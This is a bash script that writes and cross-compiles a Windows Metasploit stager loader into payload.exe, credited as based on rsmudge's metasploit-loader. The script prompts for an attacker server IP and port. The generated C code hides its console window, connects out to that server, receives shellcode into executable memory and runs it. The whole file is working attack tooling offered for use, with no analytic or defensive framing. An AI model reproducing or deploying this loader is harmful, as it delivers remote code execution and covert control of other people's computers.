
```
#!/bin/bash
clear
echo "****************************************************************"
echo " Automatic C source code generator - FOR METASPLOIT "
echo " Based on rsmudge metasploit-loader "
echo " PE32+ executable (GUI) x86-64 "
echo "****************************************************************" 
echo -en 'Metasploit server IP : ' 
read ip
echo -en 'Metasploit port number : ' 
read port

echo '#include <stdio.h>'> temp.c 
echo '#include <stdlib.h>' >> temp.c 
echo '#include <winsock2.h>' >> temp.c
echo '#include <windows.h>' >> temp.c 
echo -n 'unsigned char lambert[]="' >> temp.c 
echo -n $ip >> temp.c 
echo -n '";' >> temp.c 
echo '' >> temp.c 
echo -n 'unsigned char omega[]="' >> temp.c 
echo -n $port >> temp.c 
echo -n '";' >> temp.c 
echo '' >> temp.c 
echo 'void winsock_init() {' >> temp.c 
echo ' WSADATA wsaData;' >> temp.c 
echo ' WORD wVersionRequested;' >> temp.c 
echo ' wVersionRequested = MAKEWORD(2, 2);'>> temp.c 
echo ' if (WSAStartup(wVersionRequested, &wsaData) < 0) {' >> temp.c 
echo ' printf("bad\n"); '>> temp.c 
echo ' WSACleanup(); '>> temp.c 
echo ' exit(1);'>> temp.c 
echo ' }' >> temp.c 
echo ' }' >> temp.c 
echo ' void punt(SOCKET my_socket, char * error) {' >> temp.c 
echo ' printf("r %s\n", error);'>> temp.c 
echo ' closesocket(my_socket);'>> temp.c 
echo ' WSACleanup();'>> temp.c 
echo ' exit(1);' >> temp.c 
echo ' }' >> temp.c 
echo ' int recv_all(SOCKET my_socket, void * buffer, int len) {' >> temp.c 
echo ' int tret = 0;'>> temp.c 
echo ' int nret = 0;'>>temp.c 
echo ' void * startb = buffer;'>> temp.c 
echo ' while (tret < len) {'>>temp.c 
echo ' nret = recv(my_socket, (char *)startb, len - tret, 0);'>> temp.c 
echo ' startb += nret;'>> temp.c 
echo ' tret += nret;'>>temp.c 
echo ' if (nret == SOCKET_ERROR)'>> temp.c 
echo ' punt(my_socket, "no data");'>> temp.c 
echo ' }'>>temp.c 
echo ' return tret;'>> temp.c 
echo '}' >> temp.c 
echo 'SOCKET wsconnect(char * targetip, int port) {'>> temp.c 
echo ' struct hostent * target;' >> temp.c 
echo ' struct sockaddr_in sock;' >> temp.c
echo ' SOCKET my_socket;'>>temp.c 
echo ' my_socket = socket(AF_INET, SOCK_STREAM, 0);'>> temp.c 
echo ' if (my_socket == INVALID_SOCKET)'>> temp.c 
echo ' punt(my_socket, ".");'>>temp.c 
echo ' target = gethostbyname(targetip);'>>temp.c 
echo ' if (target == NULL)'>>temp.c 
echo ' punt(my_socket, "..");'>>temp.c 
echo ' memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);'>>temp.c 
echo ' sock.sin_family = AF_INET;'>> temp.c 
echo ' sock.sin_port = htons(port);'>>temp.c 
echo ' if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )'>>temp.c 
echo ' punt(my_socket, "...");'>>temp.c 
echo ' return my_socket;'>>temp.c 
echo '}' >> temp.c 
echo 'int main(int argc, char * argv[]) {' >> temp.c 
echo ' FreeConsole();'>>temp.c 
echo ' Sleep(15);'>>temp.c 
echo ' ULONG32 size;'>>temp.c 
echo ' char * buffer;'>>temp.c 
echo ' void (*function)();'>>temp.c 
echo ' winsock_init();'>> temp.c 
echo ' SOCKET my_socket = wsconnect(lambert, atoi(omega));'>>temp.c 
echo ' int count = recv(my_socket, (char *)&size, 4, 0);'>>temp.c 
echo ' if (count != 4 || size <= 0)'>>temp.c 
echo ' punt(my_socket, "error lenght\n");'>>temp.c 
echo ' buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);'>>temp.c 
echo ' if (buffer == NULL)'>>temp.c 
echo ' punt(my_socket, "error in buf\n");'>>temp.c 
echo ' buffer[0] = 0xBF;'>>temp.c 
echo ' memcpy(buffer + 1, &my_socket, 4);'>>temp.c 
echo ' count = recv_all(my_socket, buffer + 5, size);'>>temp.c 
echo ' function = (void (*)())buffer;'>>temp.c 
echo ' function();'>>temp.c 
echo ' return 0;'>>temp.c 
echo '}' >> temp.c 
echo '(+) Compiling binary ..' 
x86_64-w64-mingw32-gcc temp.c -o payload.exe -lws2_32 -mwindows 
ls -la temp.c
#strip payload.exe 
file=`ls -la payload.exe` ; echo '(+)' $file
```
